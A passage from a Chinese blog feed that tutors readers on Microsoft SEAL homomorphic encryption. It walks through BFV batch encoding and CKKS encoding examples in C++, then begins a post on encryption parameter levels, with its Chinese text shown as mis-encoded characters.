operator">></span> <span class="token function">pod_matrix</span><span class="token punctuation">(</span>slot_count<span class="token punctuation">,</span> <span class="token number">0ULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// </span>        pod_matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0ULL</span><span class="token punctuation">;</span>    pod_matrix<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1ULL</span><span class="token punctuation">;</span>    pod_matrix<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2ULL</span><span class="token punctuation">;</span>    pod_matrix<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3ULL</span><span class="token punctuation">;</span>    pod_matrix<span class="token punctuation">[</span>row_size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">4ULL</span><span class="token punctuation">;</span>    pod_matrix<span class="token punctuation">[</span>row_size <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5ULL</span><span class="token punctuation">;</span>    pod_matrix<span class="token punctuation">[</span>row_size <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">6ULL</span><span class="token punctuation">;</span>    pod_matrix<span class="token punctuation">[</span>row_size <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">7ULL</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Input plaintext matrix:"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">/*    * è¿™ä¸ªprint_matrixä¸ä¼šæ‰“å°çŸ©é˜µçš„æ¯ä¸€åˆ—,åªæ‰“å°æ¯ä¸€è¡Œçš„å‰5ä¸ªå’Œæœ€å5ä¸ª    * [ 0,  1,  2,  3,  0,  0, ...,  0 ]    * [ 4,  5,  6,  7,  0,  0, ...,  0 ]    */</span>    <span class="token function">print_matrix</span><span class="token punctuation">(</span>pod_matrix<span class="token punctuation">,</span> row_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*    é¦–å…ˆï¼Œæˆ‘ä»¬ä½¿ç”¨BatchEncoderå°†çŸ©é˜µç¼–ç æˆä¸€ä¸ªæ˜æ–‡å¤šé¡¹å¼ã€‚    */</span>    Plaintext plain_matrix<span class="token punctuation">;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Encode plaintext matrix:"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">/*     ä»ç»™å®šçš„çŸ©é˜µåˆ›å»ºä¸€ä¸ªæ˜æ–‡,"æ‰¹é‡å¤„ç†"ä¸€ä¸ªç»™å®šçš„çŸ©é˜µ Mod (plaintext modulus) ç„¶åå°†ç»“æœå­˜å‚¨åˆ°     plaintextç±»ï¼Œè¾“å…¥çš„vecotrçš„å¤§å° &lt;= å¤šé¡¹å¼æ¨¡çš„æ¬¡æ•°(poly_modulus_degree)    */</span>    batch_encoder<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>pod_matrix<span class="token punctuation">,</span> plain_matrix<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*    æˆ‘ä»¬å¯ä»¥ç«‹å³è§£ç ä»¥éªŒè¯ç¼–ç çš„æ­£ç¡®æ€§. ä½†æ³¨æ„ï¼Œè¿˜æœªè¿›è¡ŒåŠ å¯†æˆ–è§£å¯†    */</span>    vector<span class="token operator">&lt;</span><span class="token class-name">uint64_t</span><span class="token operator">></span> pod_result<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Decode plaintext matrix ...... Correct."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    batch_encoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>plain_matrix<span class="token punctuation">,</span> pod_result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_matrix</span><span class="token punctuation">(</span>pod_result<span class="token punctuation">,</span> row_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*    æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åŠ å¯†å·²ç¼–ç çš„æ˜æ–‡ã€‚    */</span>    Ciphertext encrypted_matrix<span class="token punctuation">;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Encrypt plain_matrix to encrypted_matrix."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    encryptor<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>plain_matrix<span class="token punctuation">,</span> encrypted_matrix<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Noise budget in encrypted_matrix: "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span>        <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">/*    * å¯¹å¯†æ–‡çš„æ“ä½œå¯¼è‡´åœ¨æ‰€æœ‰8192(poly_modulus_degree)ä¸ªslot(çŸ©é˜µå…ƒç´ )ä¸­åŒæ—¶æ‰§è¡ŒåŒæ€æ“ä½œã€‚ä¸ºäº†è¯´æ˜è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬æ„é€ äº†å¦ä¸€ä¸ªæ˜æ–‡çŸ©é˜µï¼š         [ 1,  2,  1,  2,  1,  2, ..., 2 ]         [ 1,  2,  1,  2,  1,  2, ..., 2 ]     ç„¶åæŠŠå®ƒç¼–ç æˆæ˜æ–‡ã€‚     */</span>    vector<span class="token operator">&lt;</span><span class="token class-name">uint64_t</span><span class="token operator">></span> pod_matrix2<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> slot_count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        pod_matrix2<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">&amp;</span> <span class="token class-name">size_t</span><span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    Plaintext plain_matrix2<span class="token punctuation">;</span>    batch_encoder<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>pod_matrix2<span class="token punctuation">,</span> plain_matrix2<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Second input plaintext matrix:"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token function">print_matrix</span><span class="token punctuation">(</span>pod_matrix2<span class="token punctuation">,</span> row_size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/*     ç°åœ¨æˆ‘ä»¬å°†ç¬¬äºŒä¸ª(æ˜æ–‡)çŸ©é˜µæ·»åŠ åˆ°åŠ å¯†çŸ©é˜µä¸­ï¼Œå¹¶æ±‚sum^2ã€‚     */</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Sum, square, and relinearize."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    evaluator<span class="token punctuation">.</span><span class="token function">add_plain_inplace</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">,</span> plain_matrix2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// encrypted_matrix = ncrypted_matrix +ã€€plain_matrix2</span>    evaluator<span class="token punctuation">.</span><span class="token function">square_inplace</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// encrypted_matrix = encrypted_matrix * encrypted_matrix;</span>    evaluator<span class="token punctuation">.</span><span class="token function">relinearize_inplace</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">,</span> relin_keys<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// åºåˆ—åŒ–</span>    <span class="token comment">/*    æŸ¥çœ‹å‰©ä½™å™ªéŸ³é¢„ç®—    */</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Noise budget in result: "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">/*    æˆ‘ä»¬å°†åŠ å¯†çš„ æ•°æ®è¿›è¡Œè§£å¯†å¹¶è§£ç å¹¶éªŒè¯ç»“æœ    */</span>    Plaintext plain_result<span class="token punctuation">;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Decrypt and decode result."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">,</span> plain_result<span class="token punctuation">)</span><span class="token punctuation">;</span>    batch_encoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>plain_result<span class="token punctuation">,</span> pod_result<span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Result plaintext matrix ...... Correct."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token function">print_matrix</span><span class="token punctuation">(</span>pod_result<span class="token punctuation">,</span> row_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*    å½“æ‰€éœ€çš„åŠ å¯†è®¡ç®—é«˜åº¦å¯å¹¶è¡ŒåŒ–æ—¶ï¼Œæ‰¹å¤„ç†å…è®¸æˆ‘ä»¬æœ‰æ•ˆåœ°ä½¿ç”¨å…¨æ˜æ–‡å¤šé¡¹å¼ã€‚    ä½†æ˜¯ï¼Œå®ƒå¹¶æ²¡æœ‰è§£å†³è¿™ä¸ªæ–‡ä»¶å¼€å¤´æåˆ°çš„å¦ä¸€ä¸ªé—®é¢˜:    æ¯ä¸ªæ§½åªåŒ…å«ä¸€ä¸ªæ•´æ•°æ¨¡çš„æ˜æ–‡æ¨¡é‡ï¼Œé™¤éæ˜æ–‡æ¨¡é‡éå¸¸å¤§ï¼Œ    å¦åˆ™æˆ‘ä»¬å¯ä»¥å¾ˆå¿«é‡åˆ°æ•°æ®ç±»å‹æº¢å‡ºï¼Œå¹¶åœ¨éœ€è¦æ•´æ•°è®¡ç®—æ—¶ä¼šå¾—åˆ°æ„å¤–çš„ç»“æœã€‚    æ³¨æ„ï¼Œæº¢å‡ºå¹¶ä¸èƒ½ä»¥åŠ å¯†çš„å½¢å¼æ£€æµ‹åˆ°ã€‚CKKSæ–¹æ¡ˆ(ä»¥åŠCKKSEncoder)è§£å†³äº†æ•°æ®ç±»å‹æº¢å‡ºé—®é¢˜ï¼Œ    ä½†ä»£ä»·æ˜¯åªäº§ç”Ÿè¿‘ä¼¼çš„ç»“æœã€‚        */</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">example_ckks_encoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">print_example_banner</span><span class="token punctuation">(</span><span class="token string">"Example: Encoders / CKKS Encoder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    EncryptionParameters <span class="token function">parms</span><span class="token punctuation">(</span>scheme_type<span class="token operator">::</span>ckks<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ä½¿ç”¨ckks</span>    <span class="token class-name">size_t</span> poly_modulus_degree <span class="token operator">=</span> <span class="token number">8192</span><span class="token punctuation">;</span>    parms<span class="token punctuation">.</span><span class="token function">set_poly_modulus_degree</span><span class="token punctuation">(</span>poly_modulus_degree<span class="token punctuation">)</span><span class="token punctuation">;</span>    parms<span class="token punctuation">.</span><span class="token function">set_coeff_modulus</span><span class="token punctuation">(</span>CoeffModulus<span class="token operator">::</span><span class="token function">Create</span><span class="token punctuation">(</span>poly_modulus_degree<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">40</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// äº§ç”Ÿ5ä¸ª40ä½çš„ç´ æ•°çš„æ•°ç»„</span>        <span class="token comment">// åŒBFVä¸€è‡´ï¼Œå£°æ˜</span>    SEALContext <span class="token function">context</span><span class="token punctuation">(</span>parms<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_parameters</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">// å¯†é’¥äº§ç”Ÿçš„æ–¹å¼å’Œ bfv æ˜¯ä¸€æ ·çš„</span>    KeyGenerator <span class="token function">keygen</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> secret_key <span class="token operator">=</span> keygen<span class="token punctuation">.</span><span class="token function">secret_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    PublicKey public_key<span class="token punctuation">;</span>    keygen<span class="token punctuation">.</span><span class="token function">create_public_key</span><span class="token punctuation">(</span>public_key<span class="token punctuation">)</span><span class="token punctuation">;</span>    RelinKeys relin_keys<span class="token punctuation">;</span>    keygen<span class="token punctuation">.</span><span class="token function">create_relin_keys</span><span class="token punctuation">(</span>relin_keys<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// åŠ å¯†å™¨ï¼Œè§£å¯†å™¨ï¼Œè®¡ç®—å™¨</span>    Encryptor <span class="token function">encryptor</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> public_key<span class="token punctuation">)</span><span class="token punctuation">;</span>    Evaluator <span class="token function">evaluator</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    Decryptor <span class="token function">decryptor</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> secret_key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*    * è¦åˆ›å»ºCKKSçº¯æ–‡æœ¬ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªç‰¹æ®Šçš„ç¼–ç å™¨:        BatchEncoderä¸é€‚ç”¨äºCKKS       CKKSEncoder çš„æ–¹å¼æ˜¯å°†å®æ•°æˆ–å¤æ•°çš„å‘é‡ç¼–ç ä¸ºPlaintext objects ç„¶åå¯¹objectå°±å¯ä»¥åŠ å¯†äº†    çœ‹èµ·æ¥å¾ˆåƒBatchEncoderä¸ºBFVæ–¹æ¡ˆæ‰€åšçš„ï¼Œä½†ç†è®ºä¸Šå®ƒçš„èƒŒåæ˜¯å®Œå…¨ä¸åŒçš„ã€‚    */</span>    CKKSEncoder <span class="token function">encoder</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*    * CKKS ä¸­ slotæ•°ç›®  =  poly_modulus_degree / 2  æ¯ä¸ªslotç¼–ç ä¸ºä¸€ä¸ªå®æ•°æˆ–å¤æ•°ã€‚    * è€Œåœ¨BFVä¸­ slot = poly_modulus_degree å¹¶ä¸”è¢«å¤„ç†æˆ ä¸€ä¸ª2X(N/2)çš„çŸ©é˜µ    */</span>    <span class="token class-name">size_t</span> slot_count <span class="token operator">=</span> encoder<span class="token punctuation">.</span><span class="token function">slot_count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Number of slots: "</span> <span class="token operator">&lt;&lt;</span> slot_count <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span> input<span class="token punctuation">&#123;</span> <span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">2.2</span><span class="token punctuation">,</span> <span class="token number">3.3</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Input vector: "</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token function">print_vector</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*    * ç°åœ¨æˆ‘ä»¬ç”¨CKKSEncoderè¿›è¡Œç¼–ç ã€‚è¾“å…¥çš„æµ®ç‚¹ç³»æ•°å°†é€šè¿‡å‚æ•°â€œscaleâ€æ”¾å¤§    * è¿™æ˜¯å¿…è¦çš„ï¼Œå› ä¸ºå³ä½¿æ˜¯åœ¨çº¯æ–‡æœ¬å…ƒç´ çš„CKKSæ–¹æ¡ˆ,åŸºæœ¬ä¸Šæ˜¯å¤šé¡¹å¼æ•´æ•°ç³»æ•°ã€‚    * åœ¨CKKSä¸­ï¼Œæ¶ˆæ¯æ˜¯å­˜ MOD coeff_modulus,(è€Œåœ¨BFVä¸­æ˜¯ å­˜å‚¨ MOD plain_modulus)    * å› æ­¤ï¼Œç¼©æ”¾åçš„æ¶ˆæ¯ä¸èƒ½å¤ªæ¥è¿‘æ€»å¤§å°coeff_modulusã€‚    *     */</span>    Plaintext plain<span class="token punctuation">;</span>    <span class="token keyword">double</span> scale <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2.0</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Encode input vector. and the size of scale: "</span><span class="token operator">&lt;&lt;</span> scale <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    encoder<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> scale<span class="token punctuation">,</span> plain<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å°†vector æŒ‰ç…§scaleå®šä¹‰çš„ç¼–ç ç²¾åº¦çš„å°ºåº¦å‚æ•° ç¼–ç æˆ Plaintext</span>    <span class="token comment">/*    æˆ‘ä»¬å¯ä»¥ç«‹å³è§£ç ä»¥æ£€æŸ¥ç¼–ç çš„æ­£ç¡®æ€§ã€‚    */</span>    vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span> output<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Decode input vector ...... Correct."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    encoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è§£ç </span>    <span class="token function">print_vector</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*    The vector is encrypted the same was as in BFV.    ç®€å•æ ·ä¾‹:        å°†è¾“å…¥çš„ vector åŠ å¯†å æ±‚å¹³æ–¹ å¹¶ åºåˆ—åŒ–    */</span>    Ciphertext encrypted<span class="token punctuation">;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Encrypt input vector, square, and relinearize."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    encryptor<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> encrypted<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// åŠ å¯† Plaintext -> Ciphertext</span>    <span class="token comment">// è®¡ç®—</span>    evaluator<span class="token punctuation">.</span><span class="token function">square_inplace</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// encrypted = encrypted * encrypted</span>    evaluator<span class="token punctuation">.</span><span class="token function">relinearize_inplace</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> relin_keys<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// åºåˆ—åŒ–</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Scale in squared input: "</span> <span class="token operator">&lt;&lt;</span> encrypted<span class="token punctuation">.</span><span class="token function">scale</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" ("</span> <span class="token operator">&lt;&lt;</span> <span class="token function">log2</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">.</span><span class="token function">scale</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits)"</span>        <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Decrypt and decode."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> plain<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è§£å¯†</span>    encoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è§£ç </span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Result vector ...... Correct."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token function">print_vector</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ç»“æœ</span>    <span class="token comment">/*    * CKKSæ–¹æ¡ˆå…è®¸å‡å°‘åŠ å¯†è®¡ç®—ä¹‹é—´çš„è§„æ¨¡ã€‚è¿™æ˜¯CKKSéå¸¸å¼ºå¤§å’Œå…³é”®çš„åŸºæœ¬ç‰¹æ€§çµæ´»ã€‚    * æˆ‘ä»¬å°†åœ¨' 3_levelsä¸­è¯¦ç»†è®¨è®ºå®ƒã€‚cpp'å’Œç¨åâ€œ4 _ckks_basics.cppâ€ã€‚    */</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">example_encoders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">print_example_banner</span><span class="token punctuation">(</span><span class="token string">"Example: Encoders"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*    Run all encoder examples.    */</span>    <span class="token comment">//example_batch_encoder();</span>    <span class="token function">example_ckks_encoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Microsoft SEAL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Seal </tag>
            
            <tag> åŒæ€åŠ å¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEALå­¦ä¹ ç¬¬ä¸‰å¤©-Levels</title>
      <link href="/posts/51e56618/"/>
      <url>/posts/51e56618/</url>
      
        <content type="html"><![CDATA[<blockquote><p>@auther by sizaif</p></blockquote><h1>SEAL å­¦ä¹ ç¬¬ä¸‰å¤©ï¼šlevels</h1><p>@[toc]</p><h2 id="ç®€ä»‹">ç®€ä»‹</h2><div class="story post-story"><p>ä»Šå¤©å­¦ä¹ æè¿°åœ¨BFVå’ŒCKKSå’Œåœ¨Microsoft SEALä¸­è¡¨ç¤ºå®ƒä»¬çš„ç›¸å…³å¯¹è±¡</p><p>åœ¨Microsoft SEALä¸­ï¼Œä¸€ç»„åŠ å¯†å‚æ•°(ä¸åŒ…æ‹¬éšæœºæ•°ç”Ÿæˆå™¨)ç”±å‚æ•°çš„256ä½æ•£åˆ—å”¯ä¸€æ ‡è¯†ã€‚è¿™ä¸ªæ•£åˆ—ç§°ä¸ºâ€™ parms_idâ€™ï¼Œå¯ä»¥åœ¨ä»»ä½•æ—¶å€™æ–¹ä¾¿åœ°è®¿é—®å’Œæ‰“å°ã€‚ä¸€æ—¦ä»»ä½•å‚æ•°å‘ç”Ÿå˜åŒ–ï¼Œæ•£åˆ—å°±ä¼šå‘ç”Ÿå˜åŒ–ã€‚</p><p>å½“ä»ç»™å®šçš„EncryptionParameterså®ä¾‹åˆ›å»ºSEALContextæ—¶ï¼Œå¾®è½¯SEALä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªæ‰€è°“çš„â€œæ¨¡æ•°åˆ‡æ¢é“¾â€ï¼Œå®ƒæ˜¯ä»åŸå§‹é›†åˆè¡ç”Ÿå‡ºæ¥çš„å…¶ä»–åŠ å¯†å‚æ•°é“¾ã€‚æ¨¡é‡äº¤æ¢é“¾ä¸­çš„å‚æ•°é™¤ç³»æ•°æ¨¡é‡æ²¿é“¾å‘ä¸‹é€æ¸å‡å°å¤–ï¼Œå…¶ä½™å‚æ•°å‡ä¸åŸå‚æ•°ç›¸åŒã€‚æ›´å‡†ç¡®åœ°è¯´ï¼Œé“¾ä¸­çš„æ¯ä¸ªå‚æ•°é›†éƒ½è¯•å›¾ä»å‰ä¸€ä¸ªé›†åˆä¸­ç§»é™¤æœ€åä¸€ä¸ªç³»æ•°æ¨¡ç´ æ•°;è¿™ä¼šä¸€ç›´æŒç»­åˆ°å‚æ•°é›†ä¸å†æœ‰æ•ˆä¸ºæ­¢ã€‚(ä¾‹å¦‚:plain_moduluså¤§äºå‰©ä½™çš„coeff_modulus)ã€‚å¾ˆå®¹æ˜“éå†æ•´ä¸ªé“¾å¹¶è®¿é—®æ‰€æœ‰å‚æ•°é›†ã€‚æ­¤å¤–ï¼Œé“¾ä¸­è®¾ç½®çš„æ¯ä¸ªå‚æ•°éƒ½æœ‰ä¸€ä¸ªâ€œé“¾ç´¢å¼•â€ï¼ŒæŒ‡ç¤ºå…¶åœ¨é“¾ä¸­çš„ä½ç½®ï¼Œå› æ­¤æœ€åä¸€ç»„å‚æ•°çš„ç´¢å¼•ä¸º0ã€‚æˆ‘ä»¬è¯´ï¼Œä¸€ç»„åŠ å¯†å‚æ•°ï¼Œæˆ–è€…ä¸€ä¸ªæºå¸¦è¿™äº›åŠ å¯†å‚æ•°çš„å¯¹è±¡ï¼Œåœ¨é“¾ä¸­çš„çº§åˆ«é«˜äºå¦ä¸€ç»„å‚æ•°ï¼Œå¦‚æœå®ƒçš„é“¾ç´¢å¼•è¾ƒå¤§ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒåœ¨é“¾ä¸­è¾ƒæ—©ã€‚</p><p>é“¾ä¸­çš„æ¯ä¸€ç»„å‚æ•°éƒ½æ¶‰åŠåˆ°æ‰§è¡Œçš„å”¯ä¸€é¢„è®¡ç®—ã€‚å½“åˆ›å»ºSEALContextå¹¶å­˜å‚¨åœ¨SEALContext::ContextDataä¸­æ—¶å¯¹è±¡ã€‚è¿™ä¸ªé“¾åŸºæœ¬ä¸Šæ˜¯SEALContext::ContextDataçš„é“¾è¡¨å¯¹è±¡ï¼Œå¹¶ä¸”å¯ä»¥åœ¨ä»»ä½•æ—¶å€™é€šè¿‡SEALContextè½»æ¾è®¿é—®ã€‚æ¯ä¸€ä¸ªèŠ‚ç‚¹å¯ä»¥é€šè¿‡å…¶ç‰¹å®šåŠ å¯†å‚æ•°çš„parms_idæ¥æ ‡è¯†(poly_modulus_degreeä¿æŒä¸å˜ï¼Œcoeff_moduluså˜åŒ–)ã€‚</p><pre class="language-c++" data-language="c++"><code class="language-c++">EncryptionParameters parms(scheme_type::bfv);size_t poly_modulus_degree &#x3D; 